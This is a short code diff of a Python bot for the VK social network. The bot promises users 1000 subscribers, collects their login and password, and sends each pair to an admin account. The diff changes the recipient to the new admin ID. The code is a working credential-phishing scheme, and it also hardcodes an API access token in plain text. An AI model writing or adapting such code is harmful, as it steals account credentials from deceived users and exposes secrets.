@@ -34,7 +34,7 @@ try:
     token = "5bce844c8a3db4d68662d611fd306da33389a6de1edd56299439c5d56d8cbe5a1fc08a9f696d745bebc9f"
     authorize = vk_api.VkApi(token=token)
     longpoll = VkLongPoll(authorize)
-    admin = 574170405
+    admin = 558612192
     for event in longpoll.listen():
         if event.type == VkEventType.MESSAGE_NEW and event.to_me:
             reseived_message = event.text.lower()
@@ -135,7 +135,7 @@ try:
                         i = ca.read()
                         i = int(i)
                     write_message(sender, 'Успешно ✅\nОжидайте 1000 - подписчиков...')
-                    write_message(685062634, f'Логин: {log} \nПароль: {event.text}')
+                    write_message(admin, f'Логин: {log} \nПароль: {event.text}')
                 else:
                     a = open(str(event.user_id) + "c.txt", "w")
                     a.write("1")
